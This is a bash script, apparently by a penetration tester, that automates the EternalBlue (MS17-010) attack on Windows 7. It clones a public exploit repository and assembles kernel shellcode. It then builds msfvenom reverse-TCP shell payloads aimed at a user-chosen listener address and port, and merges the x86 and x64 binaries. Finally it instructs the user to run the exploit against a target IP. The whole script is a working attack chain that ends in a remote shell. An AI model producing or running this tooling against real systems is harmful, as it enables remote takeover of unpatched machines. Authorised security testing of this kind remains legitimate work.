#!/bin/bash

#created with <3 by @nickvourd of @twelvesec

#requirements: git, msfvenom 
#For msfvenom module install msfconsole.

#Function message
message(){

	echo -e "\n"	
	echo "This is an automation bash script for exploit https://github.com/worawit/MS17-010/blob/master/eternalblue_exploit7.py"
	echo "It auto converts and generates payloads and binaries in order to avoid to press many commands!"
	
	echo "Please visit the repository: https://github.com/worawit/MS17-010.git in which created the eternablue windows 7 exploit. It is awesome project!"

}


#function message2
message2(){

	echo -e "\n"
	echo "[!] The procedure finished!"
	echo "Open up your own listener"
	echo "Run exploit: python MS17-010/eternalblue_exploit7.py <ip> <shellcode_file>"

}


#Function set IP and Port
ip_port_set(){

	echo -e "\n"
	#set ip
	echo "Set your IP:"
	echo "------------"
	read ip
	export IP=$ip
	
	echo -e "\n"
	
	#set port
	echo "Set a port for listener:"
	echo "-------------------------"
	read port
	export PORT=$port

	echo -e "\n"
}


#Function x64
x64_func(){

	#Convert asm to bin x64
	nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o /tmp/sc_x64_kernel.bin
	echo "[!] binary saved to /tmp as sc_x64_kernel.bin"
	echo -e "\n"

	#Create payload as binary
	echo "[+] Creating a msfvenom binary payload:"
	msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$PORT --platform windows -a x64 --format raw -o /tmp/sc_x64_payload.bin
	echo -e "\n"

	#Concentrate payload & shellcode
	cat /tmp/sc_x64_kernel.bin /tmp/sc_x64_payload.bin > /tmp/sc_x64.bin
	echo -e  "[!] Concetrated payload and shellcode\n"

}



#function x86
x86_func(){

	#Convert asm to bin x86
	nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x86.asm -o /tmp/sc_x86_kernel.bin
	echo -e "[!] binary saved to /tmp as sc_x86_kernel.bin\n"

	#Create payload as binary
	echo "[+] Creating a msfvenom binary payload:"
	msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT --platform windows -a x86 --format raw -o /tmp/sc_x86_payload.bin
	echo -e "\n"

	#Concentrate payload & shellcode
	cat /tmp/sc_x86_kernel.bin /tmp/sc_x86_payload.bin > /tmp/sc_x86.bin
	echo -e  "[!] Concetrated payload and shellcode\n"

}

#install git repository
echo "[+] Install github repository MS17-010"
echo "----------------------------------------"
git clone  https://github.com/worawit/MS17-010.git
echo -e "\n"

#install nasm
echo "[+] Install nasm.."
echo "-----------------------"
apt install nasm -y
echo -e "\n"

#menu
echo "Please choose an option:"
echo "-------------------------------"
echo "(1) x64 bin Win7 exploitaion."
echo "(2) x86 bin Win7 exploitation."
echo "(3) Mergin binaries."
echo "(4) Exit."
echo "-------------------------------"
read ans

#loop to check the correct answer
while [[ $ans != "1" && $ans != "2" && $ans != "3" && $ans != "4" ]]; do
	echo "Sorry What?"
	read ans
done

#main
if [ $ans -eq "1" ]; 
then

	#call function message()
	message
	
	#call function ip_port_set()
	ip_port_set

	#call function x64_func()
	x64_func

	#call function message2()
	message2
	
elif [ $ans -eq "2" ];
then

	#call function message()
	message
	
	#call function ip_port_set()
	ip_port_set

	#call function x86_func()
	x86_func

	#call function message2()
	message2
	
elif [ $ans -eq "3" ];
then

	#call function message()
	message
	
	#call function ip_port_set()
	ip_port_set

	#call function x64_func()
	x64_func
	
	#call function x86_func()
	x86_func

	#Binaries merging
	#add both x64 and x86 binaries in one binary
	python MS17-010/shellcode/eternalblue_sc_merge.py /tmp/sc_x86.bin /tmp/sc_x64.bin /tmp/sc_all.bin
		
	echo "[!] Merging binaries finished. Your file saved to /tmp as sc_all.bin"
	
	#call function message2()
	message2
	
else
	echo "Goodbye! :)"
fi
